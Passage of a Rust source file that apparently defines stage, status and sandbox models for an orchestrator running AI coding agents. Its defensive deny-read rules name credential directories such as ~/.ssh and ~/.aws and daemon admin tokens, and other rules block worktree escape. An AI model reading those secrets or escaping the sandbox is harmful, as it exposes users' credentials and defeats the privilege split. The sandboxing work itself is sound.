use chrono::{DateTime, Utc};
use serde::{Deserialize, Deserializer, Serialize};
use serde_json::Value;

use crate::models::failure::FailureInfo;

/// Type of stage for specialized handling.
///
/// Use this to distinguish between knowledge-gathering stages and standard
/// implementation stages.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Default, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum StageType {
    /// Standard implementation stage
    #[default]
    Standard,
    /// Knowledge-gathering stage (e.g., knowledge-bootstrap)
    /// Can use both `loom memory` and `loom knowledge` commands
    Knowledge,
    /// Integration verification stage (e.g., integration-verify)
    /// Can use `loom memory` and `loom knowledge` (for curating memories)
    IntegrationVerify,
    /// Knowledge distillation stage (runs after integration-verify)
    /// Reads all stage memories and curates into permanent knowledge.
    /// This is a WORKTREE stage — NOT a Knowledge stage. It gets a branch
    /// and merge like Standard/IntegrationVerify.
    KnowledgeDistill,
}

impl StageType {
    /// Fallback model when the plan does not specify one.
    /// Plans SHOULD always set `model` explicitly per stage — the plan writer
    /// chooses opus vs sonnet based on whether the stage is architectural
    /// (needs judgment) or execution-focused (detailed instructions).
    /// This fallback is a safety net, not the intended path.
    pub fn default_model(&self) -> &'static str {
        match self {
            // Knowledge stages are lightweight exploration — sonnet suffices
            StageType::Knowledge => "sonnet",
            // KnowledgeDistill is mechanical curation work — sonnet suffices
            StageType::KnowledgeDistill => "sonnet",
            // Standard and integration-verify stages default to opus
            StageType::Standard | StageType::IntegrationVerify => "opus[1m]",
        }
    }

    /// Default reasoning effort for this stage type, given the effective model.
    /// Sonnet stages need high effort to compensate for the capability gap.
    /// Opus 4.7 1M-context stages use xhigh for thoroughness on architectural work.
    /// Any other model defaults to high.
    pub fn default_reasoning_effort(&self, effective_model: &str) -> &'static str {
        if effective_model == "opus[1m]" {
            "xhigh"
        } else {
            "high"
        }
    }
}

/// Hint for how the stage should be executed.
///
/// This is an advisory field for orchestration tooling:
/// - `Single`: Default mode, single agent executes the stage
/// - `Team`: Stage benefits from coordinated multi-agent work
#[derive(Debug, Clone, Copy, PartialEq, Eq, Default, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum ExecutionMode {
    /// Single agent executes the stage (default)
    #[default]
    Single,
    /// Coordinated multi-agent team execution
    Team,
}

/// Wiring check to verify component connections.
///
/// Used in goal-backward verification to ensure critical connections
/// between components are in place.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct WiringCheck {
    /// Source file path (relative to working_dir)
    pub source: String,
    /// What to check for (grep pattern)
    pub pattern: String,
    /// Human-readable description of what this verifies
    pub description: String,
}

/// Claude Code permission mode controlling default tool-approval behavior.
///
/// Serialized as kebab-case in YAML (`accept-edits`, `bypass-permissions`) but
/// emitted to Claude Code's `settings.json` as camelCase via
/// [`PermissionMode::as_settings_value`].
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum PermissionMode {
    /// Prompt for every action requiring approval.
    Default,
    /// Auto-accept Edit/Write operations on session-owned files.
    AcceptEdits,
    /// Auto-accept any action Claude's heuristics deem safe.
    Auto,
    /// Plan-only mode — propose changes without executing them.
    Plan,
    /// Bypass all permission prompts.
    BypassPermissions,
}

impl PermissionMode {
    /// Return the camelCase string Claude Code expects in `settings.json`
    /// under `permissions.defaultMode`.
    pub fn as_settings_value(self) -> &'static str {
        match self {
            PermissionMode::Default => "default",
            PermissionMode::AcceptEdits => "acceptEdits",
            PermissionMode::Auto => "auto",
            PermissionMode::Plan => "plan",
            PermissionMode::BypassPermissions => "bypassPermissions",
        }
    }
}

/// Per-stage sandbox configuration (overrides plan-level defaults)
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct StageSandboxConfig {
    /// Override enabled setting for this stage
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub enabled: Option<bool>,

    /// Override auto_allow setting for this stage
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub auto_allow: Option<bool>,

    /// Override allow_unsandboxed_escape for this stage
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub allow_unsandboxed_escape: Option<bool>,

    /// Additional excluded commands for this stage
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub excluded_commands: Vec<String>,

    /// Filesystem overrides for this stage
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub filesystem: Option<FilesystemConfig>,

    /// Network overrides for this stage
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub network: Option<NetworkConfig>,

    /// Linux-specific overrides for this stage
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub linux: Option<LinuxConfig>,

    /// Per-stage Claude Code permission-mode override.
    /// When unset, the plan-level override (or stage type default) applies.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub permission_mode: Option<PermissionMode>,
}

/// Filesystem access configuration
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FilesystemConfig {
    /// Paths that agents cannot read (glob patterns)
    /// Default: ~/.ssh/**, ~/.aws/**, ~/.config/gcloud/**, ~/.gnupg/**
    #[serde(default = "default_deny_read")]
    pub deny_read: Vec<String>,

    /// Paths that agents cannot write (glob patterns)
    /// Default: ../../**, doc/loom/knowledge/**
    #[serde(default = "default_deny_write")]
    pub deny_write: Vec<String>,

    /// Additional paths agents are allowed to write (glob patterns)
    /// Use this to grant exceptions to deny rules
    #[serde(default)]
    pub allow_write: Vec<String>,
}

impl Default for FilesystemConfig {
    fn default() -> Self {
        Self {
            deny_read: default_deny_read(),
            deny_write: default_deny_write(),
            allow_write: Vec::new(),
        }
    }
}

/// Network access configuration
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct NetworkConfig {
    /// Allowed network domains (glob patterns)
    /// Empty means no network access allowed
    #[serde(default)]
    pub allowed_domains: Vec<String>,

    /// Additional domains to allow beyond the defaults
    #[serde(default)]
    pub additional_domains: Vec<String>,

    /// Allow binding to local ports (default: false)
    #[serde(default)]
    pub allow_local_binding: bool,

    /// Allow specific Unix socket paths (glob patterns)
    /// Accepts either a list of paths or `false` (treated as empty list)
    #[serde(default, deserialize_with = "deserialize_bool_or_string_vec")]
    pub allow_unix_sockets: Vec<String>,

    /// Allow all Unix socket connections (default: false)
    #[serde(default)]
    pub allow_all_unix_sockets: bool,
}

/// Linux-specific sandbox configuration
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct LinuxConfig {
    /// Enable weaker nested sandboxing for compatibility (default: false)
    /// Use this if running inside containers or VMs with restricted capabilities
    #[serde(default)]
    pub enable_weaker_nested: bool,
}

/// Deserializes a field that can be either a boolean `false` (→ empty vec) or a list of strings.
/// This allows plan authors to write `allow_unix_sockets: false` as shorthand for an empty list.
fn deserialize_bool_or_string_vec<'de, D>(deserializer: D) -> Result<Vec<String>, D::Error>
where
    D: Deserializer<'de>,
{
    #[derive(Deserialize)]
    #[serde(untagged)]
    enum BoolOrVec {
        #[allow(dead_code)]
        Bool(bool),
        Vec(Vec<String>),
    }

    match BoolOrVec::deserialize(deserializer)? {
        BoolOrVec::Bool(_) => Ok(Vec::new()),
        BoolOrVec::Vec(v) => Ok(v),
    }
}

fn default_deny_read() -> Vec<String> {
    vec![
        // Sensitive credential directories
        "~/.ssh/**".to_string(),
        "~/.aws/**".to_string(),
        "~/.config/gcloud/**".to_string(),
        "~/.gnupg/**".to_string(),
        // Daemon IPC tokens — must never be readable by a sandboxed worktree
        // agent. The broad `.work/**` allow (emitted to grant the worktree its
        // EROFS exemption) would otherwise expose `.work/admin.token` (Admin
        // capability) and `.work/user.token` (User capability), defeating the
        // RPC privilege split. These deny entries must be emitted *before* the
        // broad allow (deny-before-allow) — that ordering is handled by the
        // settings emitter; here we only declare the carve-out. Both relative
        // forms are listed because `.work` is a symlink and Claude Code matches
        // patterns against the path as written.
        ".work/admin.token".to_string(),
        ".work/user.token".to_string(),
        "../.work/admin.token".to_string(),
        "../.work/user.token".to_string(),
        // Worktree escape prevention - block access to parent directories
        "../../**".to_string(),
        // Block access to other worktrees
        "../.worktrees/**".to_string(),
    ]
}

fn default_deny_write() -> Vec<String> {
    vec![
        // Worktree escape prevention - block writes to parent directories
        "../../**".to_string(),
        // Knowledge files - protected by default, knowledge stages get explicit allow
        "doc/loom/knowledge/**".to_string(),
    ]
}

/// Enhanced truth check with extended success criteria.
///
/// TruthCheck allows verifying observable behaviors with more than just exit code.
/// All extended fields are optional for backward compatibility.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct TruthCheck {
    /// Shell command to execute
    pub command: String,
    /// Strings that must appear in stdout
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub stdout_contains: Vec<String>,
    /// Strings that must NOT appear in stdout
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub stdout_not_contains: Vec<String>,
    /// Whether stderr must be empty (default: false, meaning stderr is ignored)
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub stderr_empty: Option<bool>,
    /// Expected exit code (default: 0)
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub exit_code: Option<i32>,
    /// Human-readable description of what this truth verifies
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub description: Option<String>,
}

/// Unified acceptance criterion - either a simple shell command or an extended check.
///
/// In YAML, simple criteria are plain strings, extended criteria are objects:
/// ```yaml
/// acceptance:
///   - "cargo test"                           # Simple
///   - command: "loom --help"                  # Extended
///     stdout_contains: ["Usage:"]
///     exit_code: 0
/// ```
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(untagged)]
pub enum AcceptanceCriterion {
    /// Simple shell command - succeeds if exit code is 0
    Simple(String),
    /// Extended check with output validation (reuses TruthCheck structure)
    Extended(TruthCheck),
}

impl AcceptanceCriterion {
    /// Get the shell command string for this criterion
    pub fn command(&self) -> &str {
        match self {
            AcceptanceCriterion::Simple(cmd) => cmd,
            AcceptanceCriterion::Extended(check) => &check.command,
        }
    }

    /// Whether this is an extended criterion with output validation
    pub fn is_extended(&self) -> bool {
        matches!(self, AcceptanceCriterion::Extended(_))
    }
}

impl std::fmt::Display for AcceptanceCriterion {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(f, "{}", self.command())
    }
}

/// Success criteria for wiring tests.
///
/// Defines how to determine if a wiring test passed.
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct SuccessCriteria {
    /// Expected exit code (default: 0)
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub exit_code: Option<i32>,
    /// Strings that must appear in stdout
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub stdout_contains: Vec<String>,
    /// Strings that must NOT appear in stdout
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub stdout_not_contains: Vec<String>,
    /// Strings that must appear in stderr
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub stderr_contains: Vec<String>,
    /// Whether stderr must be empty
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub stderr_empty: Option<bool>,
}

/// Wiring test to verify component integration.
///
/// Unlike WiringCheck (grep-based pattern matching), WiringTest runs
/// actual commands to verify runtime behavior of component connections.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct WiringTest {
    /// Human-readable name for this test
    pub name: String,
    /// Shell command to execute
    pub command: String,
    /// Success criteria for this test
    #[serde(default)]
    pub success_criteria: SuccessCriteria,
    /// Human-readable description of what this test verifies
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub description: Option<String>,
}

/// Configuration for dead code detection.
///
/// Runs a command and checks output for patterns indicating dead code.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DeadCodeCheck {
    /// Command to run for dead code detection (e.g., "cargo build --message-format=json")
    pub command: String,
    /// Patterns in output that indicate dead code (e.g., "warning: unused")
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub fail_patterns: Vec<String>,
    /// Patterns to ignore (e.g., "allowed_unused_function")
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub ignore_patterns: Vec<String>,
}

/// Regression test requirement for bug-fix stages.
///
/// When a stage is marked as `bug_fix: true`, a regression test must be defined
/// to verify the fix is actually tested and won't regress.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RegressionTest {
    /// Path to the test file (relative to working_dir)
    pub file: String,
    /// Patterns that must appear in the test file content
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub must_contain: Vec<String>,
}

/// Allowed values for `reasoning_effort` on a stage.
///
/// Anchored to the set Claude Code itself accepts on its CLI. Adding a new
/// value here requires a coordinated change in `native/mod.rs` where the
/// effort is concatenated into the command line as `--effort <value>`.
pub const ALLOWED_REASONING_EFFORTS: &[&str] = &["low", "medium", "high", "xhigh", "max"];

/// Status of goal-backward verification for a stage
#[derive(Debug, Clone, Serialize, Deserialize, Default, PartialEq, Eq)]
#[serde(rename_all = "kebab-case")]
pub enum VerificationStatus {
    /// Verification has not been run
    #[default]
    NotRun,
    /// All verifications passed
    Passed,
    /// Gaps were found
    GapsFound {
        /// Number of gaps found
        gap_count: usize,
    },
    /// Some checks require human judgment
    HumanNeeded,
}

impl std::fmt::Display for VerificationStatus {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            VerificationStatus::NotRun => write!(f, "NotRun"),
            VerificationStatus::Passed => write!(f, "Passed"),
            VerificationStatus::GapsFound { gap_count } => write!(f, "GapsFound({gap_count})"),
            VerificationStatus::HumanNeeded => write!(f, "HumanNeeded"),
        }
    }
}

/// A structured output from a completed stage that can be passed to dependent stages.
///
/// Outputs allow stages to communicate computed values, discovered paths, or
/// configuration decisions to downstream stages via signals.
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
pub struct StageOutput {
    /// Unique key for this output within the stage (e.g., "jwt_secret_location")
    pub key: String,
    /// The output value (can be string, number, boolean, array, or object)
    pub value: Value,
    /// Human-readable description of what this output represents
    pub description: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Stage {
    pub id: String,
    pub name: String,
    pub description: Option<String>,
    pub status: StageStatus,
    pub dependencies: Vec<String>,
    pub parallel_group: Option<String>,
    pub acceptance: Vec<AcceptanceCriterion>,
    #[serde(default)]
    pub setup: Vec<String>,
    pub files: Vec<String>,
    /// Type of stage for specialized handling (knowledge vs standard)
    #[serde(default)]
    pub stage_type: StageType,
    pub plan_id: Option<String>,
    pub worktree: Option<String>,
    pub session: Option<String>,
    #[serde(default)]
    pub held: bool,
    pub parent_stage: Option<String>,
    pub child_stages: Vec<String>,
    pub created_at: DateTime<Utc>,
    pub updated_at: DateTime<Utc>,
    pub completed_at: Option<DateTime<Utc>>,
    /// When the stage first transitioned to Executing.
    /// Persisted to track timing even after orchestrator restart.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub started_at: Option<DateTime<Utc>>,
    /// Final duration in seconds (computed when stage completes).
    /// Persisted so timing is retained even after completion.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub duration_secs: Option<i64>,
    /// Accumulated execution time in seconds across all attempts.
    /// Only counts time spent in Executing state (excludes backoff/waiting).
    /// Managed by `begin_attempt()` and `accumulate_attempt_time()` in methods.rs.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub execution_secs: Option<i64>,
    /// Timestamp when the current execution attempt started.
    /// Set on each transition to Executing, cleared when attempt ends.
    /// See `begin_attempt()` and `accumulate_attempt_time()` in methods.rs.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub attempt_started_at: Option<DateTime<Utc>>,
    pub close_reason: Option<String>,
    #[serde(default)]
    pub auto_merge: Option<bool>,
    /// Working directory for acceptance criteria, relative to worktree root.
    /// If set, criteria run from this subdirectory instead of worktree root.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub working_dir: Option<String>,
    /// Number of retry attempts for this stage
    #[serde(default)]
    pub retry_count: u32,
    /// Maximum retries allowed (None = use global default of 3)
    #[serde(default)]
    pub max_retries: Option<u32>,
    /// Timestamp of last failure (for backoff calculation)
    pub last_failure_at: Option<DateTime<Utc>>,
    /// Detailed failure information if stage is blocked due to failure
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub failure_info: Option<FailureInfo>,
    /// The resolved base branch used for worktree creation
    /// Format: "main", "loom/dep-id", or "loom/_base/stage-id" (temp merge)
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub resolved_base: Option<String>,
    /// Base branch used for this stage's worktree
    /// Either inherited from a single dependency (e.g., "loom/dep-stage")
    /// or a merged base branch (e.g., "loom/_base/stage-id")
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub base_branch: Option<String>,
    /// Dependencies that were merged to create the base branch (if multiple deps)
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub base_merged_from: Vec<String>,
    /// Structured outputs from this stage for dependent stages
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub outputs: Vec<StageOutput>,
    /// SHA of HEAD commit when stage completed
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub completed_commit: Option<String>,
    /// Whether this stage's changes have been merged to the merge point.
    ///
    /// Semantics vary by completion mode:
    /// - **Normal completion**: `true` only after successful git merge
    /// - **`--no-verify` completion**: merge is skipped entirely, remains `false`
    /// - **`--force-unsafe` completion**: follows `--assume-merged` flag:
    ///   - With `--assume-merged`: set to `true` (assumes manual merge)
    ///   - Without `--assume-merged`: remains `false` (manual merge needed)
    ///
    /// Dependent stages only transition to `Queued` when dependencies have BOTH
    /// `status == Completed` AND `merged == true`. This ensures dependents can
    /// use the merge point as their base, containing all dependency work.
    #[serde(default)]
    pub merged: bool,
    /// Whether stage has unresolved merge conflicts
    #[serde(default)]
    pub merge_conflict: bool,
    /// Goal-backward verification status
    #[serde(default)]
    pub verification_status: VerificationStatus,
    /// Stage-specific context budget (percentage)
    #[serde(default)]
    pub context_budget: Option<u32>,
    /// Files that must exist with real implementation (not stubs)
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub artifacts: Vec<String>,
    /// Critical connections between components
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub wiring: Vec<WiringCheck>,
    /// Runtime wiring tests (command-based integration verification)
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub wiring_tests: Vec<WiringTest>,
    /// Dead code detection configuration
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub dead_code_check: Option<DeadCodeCheck>,
    /// Before-stage verification checks (pre-conditions)
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub before_stage: Vec<TruthCheck>,
    /// After-stage verification checks (post-conditions)
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub after_stage: Vec<TruthCheck>,
    /// Number of fix attempts made for this stage (acceptance/review cycles)
    #[serde(default)]
    pub fix_attempts: u32,
    /// Number of disputes filed against this stage's acceptance criteria.
    #[serde(default)]
    pub dispute_count: u32,
    /// Number of evidence-loop rounds (NeedsMoreEvidence -> Executing -> NeedsAdjudication).
    #[serde(default)]
    pub evidence_rounds: u32,
    /// Number of accepted plan amendments applied for this stage.
    #[serde(default)]
    pub amendments_applied: u32,
    /// Per-stage sandbox configuration
    #[serde(default)]
    pub sandbox: StageSandboxConfig,
    /// Hint for execution mode (single agent vs team)
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub execution_mode: Option<ExecutionMode>,
    /// Maximum fix attempts allowed (None = use default of 3)
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub max_fix_attempts: Option<u32>,
    /// Reason the stage was flagged for human review
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub review_reason: Option<String>,
    /// Whether this stage is a bug fix that requires a regression test
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub bug_fix: Option<bool>,
    /// Regression test requirement (required when bug_fix is true)
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub regression_test: Option<RegressionTest>,
    /// Model override for this stage (e.g., "sonnet", "opus", "haiku")
    /// When set, Claude Code sessions for this stage use this model
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub model: Option<String>,
    /// Reasoning effort override for this stage (e.g., "low", "medium", "high", "max")
    /// When set, Claude Code sessions for this stage use this effort level.
    /// Re-validated against `ALLOWED_REASONING_EFFORTS` on load — an invalid value
    /// persisted to disk is dropped to `None` rather than reaching the spawn command.
    #[serde(
        default,
        skip_serializing_if = "Option::is_none",
        deserialize_with = "deserialize_persisted_reasoning_effort"
    )]
    pub reasoning_effort: Option<String>,
    /// Whether the monitor has flagged this stage's session as possibly stuck.
    /// Derived at read time from `.work/monitor/soft-signals.jsonl`; never persisted
    /// to stage files (and never read back from them).
    #[serde(skip)]
    pub is_possibly_stuck: bool,
}

/// Status of a stage in the execution lifecycle.
///
/// State machine transitions:
/// - `WaitingForDeps` -> `Queued` (when all dependencies are Completed AND merged)
/// - `Queued` -> `Executing` | `Blocked` (when session spawns, or pre-execution failure)
/// - `Executing` -> `Completed` | `Blocked` | `NeedsHandoff` | `WaitingForInput`
/// - `WaitingForInput` -> `Executing` (when input provided)
/// - `Blocked` -> `Queued` (when unblocked)
/// - `NeedsHandoff` -> `Queued` (when new session resumes)
/// - `Completed` is terminal for work, but stage may still be pending merge
///
/// # Scheduling Invariant
///
/// A stage transitions to `Queued` only when ALL dependencies have BOTH:
/// - `status == Completed` (work is done)
/// - `merged == true` (changes merged to main)
///
/// This ensures dependent stages can use main as their base, containing all
/// dependency work.
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub enum StageStatus {
    /// Stage is waiting for upstream dependencies to complete AND merge.
    /// Cannot be executed until all dependencies are Completed with `merged: true`.
    #[serde(rename = "waiting-for-deps", alias = "pending")]
    WaitingForDeps,

    /// Stage dependencies are satisfied and merged; queued for execution.
    /// Orchestrator will pick from Queued stages to spawn sessions.
    #[serde(rename = "queued", alias = "ready")]
    Queued,

    /// Stage is actively being worked on by a session.
    #[serde(rename = "executing")]
    Executing,

    /// Stage needs user input/decision before continuing.
    #[serde(rename = "waiting-for-input")]
    WaitingForInput,

    /// Stage encountered an error and was stopped.
    /// Can be unblocked back to Queued after intervention.
    #[serde(rename = "blocked")]
    Blocked,

    /// Stage work is done. May still need merging before dependents can run.
    /// See `merged` field on Stage for merge status.
    #[serde(rename = "completed", alias = "verified")]
    Completed,

    /// Session hit context limit; needs new session to continue.
    #[serde(rename = "needs-handoff", alias = "needshandoff")]
    NeedsHandoff,

    /// Stage was explicitly skipped by user.
    /// Terminal state - does NOT satisfy dependencies.
    #[serde(rename = "skipped")]
    Skipped,

    /// Stage completed work but has merge conflicts to resolve.
    /// Transitions from Executing when progressive merge detects conflicts.
    /// Spawns a conflict resolution session to handle the merge.
    #[serde(rename = "merge-conflict")]
    MergeConflict,

    /// Stage finished executing but acceptance criteria failed.
    /// Can be retried by transitioning back to Executing.
    #[serde(rename = "completed-with-failures")]
    CompletedWithFailures,

    /// Stage merge failed with an actual error (not conflicts).
    /// Can be retried by transitioning back to Executing.
    #[serde(rename = "merge-blocked")]
    MergeBlocked,

    /// Stage needs human review before continuing.
    /// The agent has flagged something that requires human judgment.
    #[serde(rename = "needs-human-review")]
    NeedsHumanReview,

    /// Stage's acceptance criterion was disputed; awaiting an
    /// adjudicator verdict. The dispute records live at
    /// .work/disputes/<stage>/<n>/.
    #[serde(rename = "needs-adjudication")]
    NeedsAdjudication,
}

/// Coarse classification of a [`StageStatus`] into one of four display/summary
/// buckets.
///
/// This is the single source of truth for the executing/pending/completed/blocked
/// categorization that both the CLI status collector and the daemon status
/// responder need. Those two used to keep independently hand-synced match blocks
/// (the "matching CLI semantics" comment was the tell); they now both route
/// through [`StageStatus::bucket`].
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum StatusBucket {
    /// A session is (or should be) actively working: `Executing`, plus the
    /// active-attention handoff/input states the daemon counts as ongoing work.
    Executing,
    /// Not yet started, waiting in the scheduler: `WaitingForDeps`, `Queued`.
    Pending,
    /// Terminal success-ish: `Completed`, `Skipped`.
    Completed,
    /// Stopped and needing attention: `Blocked`, the merge-failure states, and the
    /// review/adjudication states.
    Blocked,
}

impl std::fmt::Display for StageStatus {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            StageStatus::WaitingForDeps => write!(f, "WaitingForDeps"),
            StageStatus::Queued => write!(f, "Queued"),
            StageStatus::Executing => write!(f, "Executing"),
            StageStatus::WaitingForInput => write!(f, "WaitingForInput"),
            StageStatus::Blocked => write!(f, "Blocked"),
            StageStatus::Completed => write!(f, "Completed"),
            StageStatus::NeedsHandoff => write!(f, "NeedsHandoff"),
            StageStatus::Skipped => write!(f, "Skipped"),
            StageStatus::MergeConflict => write!(f, "MergeConflict"),
            StageStatus::CompletedWithFailures => write!(f, "CompletedWithFailures"),
            StageStatus::MergeBlocked => write!(f, "MergeBlocked"),
            StageStatus::NeedsHumanReview => write!(f, "NeedsHumanReview"),
            StageStatus::NeedsAdjudication => write!(f, "NeedsAdjudication"),
        }
    }
}

impl std::str::FromStr for StageStatus {
    type Err = anyhow::Error;

    fn from_str(s: &str) -> std::result::Result<Self, Self::Err> {
        match s {
            "executing" => Ok(StageStatus::Executing),
            "waiting-for-deps" | "pending" => Ok(StageStatus::WaitingForDeps),
            "queued" | "ready" => Ok(StageStatus::Queued),
            "completed" | "verified" => Ok(StageStatus::Completed),
            "blocked" => Ok(StageStatus::Blocked),
            "needs-handoff" | "needshandoff" => Ok(StageStatus::NeedsHandoff),
            "waiting-for-input" => Ok(StageStatus::WaitingForInput),
            "merge-conflict" => Ok(StageStatus::MergeConflict),
            "completed-with-failures" => Ok(StageStatus::CompletedWithFailures),
            "merge-blocked" => Ok(StageStatus::MergeBlocked),
            "skipped" => Ok(StageStatus::Skipped),
            "needs-human-review" => Ok(StageStatus::NeedsHumanReview),
            "needs-adjudication" => Ok(StageStatus::NeedsAdjudication),
            _ => anyhow::bail!("Unknown stage status: '{s}'"),
        }
    }
}

impl StageStatus {
    /// Returns the icon character for this status
    pub fn icon(&self) -> &'static str {
        match self {
            Self::Completed => "\u{2713}",      // ✓
            Self::Executing => "\u{25CF}",      // ●
            Self::Queued => "\u{25B6}",         // ▶
            Self::WaitingForDeps => "\u{25CB}", // ○
            Self::WaitingForInput => "?",
            Self::Blocked => "\u{2717}",               // ✗
            Self::NeedsHandoff => "\u{27F3}",          // ⟳
            Self::Skipped => "\u{2298}",               // ⊘
            Self::MergeConflict => "\u{26A1}",         // ⚡
            Self::CompletedWithFailures => "\u{26A0}", // ⚠
            Self::MergeBlocked => "\u{2297}",          // ⊗
            Self::NeedsHumanReview => "\u{23F8}",      // ⏸
            Self::NeedsAdjudication => "\u{2696}",     // ⚖
        }
    }

    /// Returns the terminal color for this status (for the `colored` crate)
    pub fn terminal_color(&self) -> colored::Color {
        use colored::Color;
        match self {
            Self::Completed => Color::Green,
            Self::Executing => Color::Blue,
            Self::Queued => Color::Cyan,
            Self::WaitingForDeps => Color::White,
            Self::WaitingForInput => Color::Magenta,
            Self::Blocked => Color::Red,
            Self::NeedsHandoff => Color::Yellow,
            Self::Skipped => Color::White,
            Self::MergeConflict => Color::Yellow,
            Self::CompletedWithFailures => Color::Red,
            Self::MergeBlocked => Color::Red,
            Self::NeedsHumanReview => Color::Magenta,
            Self::NeedsAdjudication => Color::Yellow,
        }
    }

    /// Returns whether this status should be bold
    pub fn is_bold(&self) -> bool {
        // Bold by default except for low-attention states.
        // NeedsAdjudication is bold (active attention needed).
        !matches!(
            self,
            Self::WaitingForDeps | Self::Skipped | Self::NeedsHumanReview
        )
    }

    /// Returns whether this status should be dimmed
    pub fn is_dimmed(&self) -> bool {
        matches!(self, Self::WaitingForDeps)
    }

    /// Returns whether this status should be strikethrough
    pub fn is_strikethrough(&self) -> bool {
        matches!(self, Self::Skipped)
    }

    /// Returns the ratatui style for this status
    pub fn tui_style(&self) -> ratatui::style::Style {
        use ratatui::style::{Color, Modifier, Style};
        let mut style = Style::default();

        let color = match self {
            Self::Completed => Color::Green,
            Self::Executing => Color::Blue,
            Self::Queued => Color::Cyan,
            Self::WaitingForDeps => Color::Gray,
            Self::WaitingForInput => Color::Magenta,
            Self::Blocked => Color::Red,
            Self::NeedsHandoff => Color::Yellow,
            Self::Skipped => Color::DarkGray,
            Self::MergeConflict => Color::Yellow,
            Self::CompletedWithFailures => Color::Red,
            Self::MergeBlocked => Color::Red,
            Self::NeedsHumanReview => Color::Magenta,
            Self::NeedsAdjudication => Color::Yellow,
        };
        style = style.fg(color);

        if self.is_bold() {
            style = style.add_modifier(Modifier::BOLD);
        }

        style
    }

    /// Returns the authoritative short label for this status.
    ///
    /// This is the single source of truth for the compact status label used by
    /// every renderer (status summary, completion table, TUI). Renderers MUST
    /// call this rather than hand-rolling their own match — past divergence
    /// (`"MergeErr"` here vs `"MergeBlk"` in two renderers) is exactly the bug
    /// this consolidation prevents.
    pub fn label(&self) -> &'static str {
        match self {
            Self::Completed => "Completed",
            Self::Executing => "Executing",
            Self::Queued => "Queued",
            Self::WaitingForDeps => "Waiting",
            Self::WaitingForInput => "Input",
            Self::Blocked => "Blocked",
            Self::NeedsHandoff => "Handoff",
            Self::Skipped => "Skipped",
            Self::MergeConflict => "Conflict",
            Self::CompletedWithFailures => "Failed",
            Self::MergeBlocked => "MergeBlk",
            Self::NeedsHumanReview => "Review",
            Self::NeedsAdjudication => "Adjudicate",
        }
    }

    /// Classify this status into a coarse [`StatusBucket`].
    ///
    /// The mapping matches the established daemon/CLI semantics:
    /// - `NeedsHandoff` and `WaitingForInput` are **Executing** — they are active
    ///   states where work is ongoing (per the existing daemon comment at
    ///   `daemon/server/status.rs`: "NeedsHandoff and WaitingForInput are active
    ///   states where work is ongoing, so they belong in executing").
